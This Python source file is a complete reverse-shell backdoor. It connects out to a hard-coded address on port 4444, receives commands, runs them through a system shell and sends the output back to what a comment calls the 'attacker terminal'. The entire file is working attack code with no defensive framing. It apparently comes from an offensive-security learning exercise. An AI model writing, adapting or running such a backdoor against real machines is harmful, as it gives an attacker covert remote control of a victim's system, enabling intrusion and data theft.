#!/usr/bin/env python

import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket object
        self.connection.connect((ip, port))  # specify IP and Port of the destination for the connection

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)  # executes command. shell=True turns it into a string
        # returns result of executed command

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command)
            # Adds received data/command to function exe_sys_command which will run
            self.connection.send(command_result)  # sends command results to attacker terminal

        connection.close()


my_backdoor = Backdoor("192.168.1.113", 4444)
my_backdoor.run()
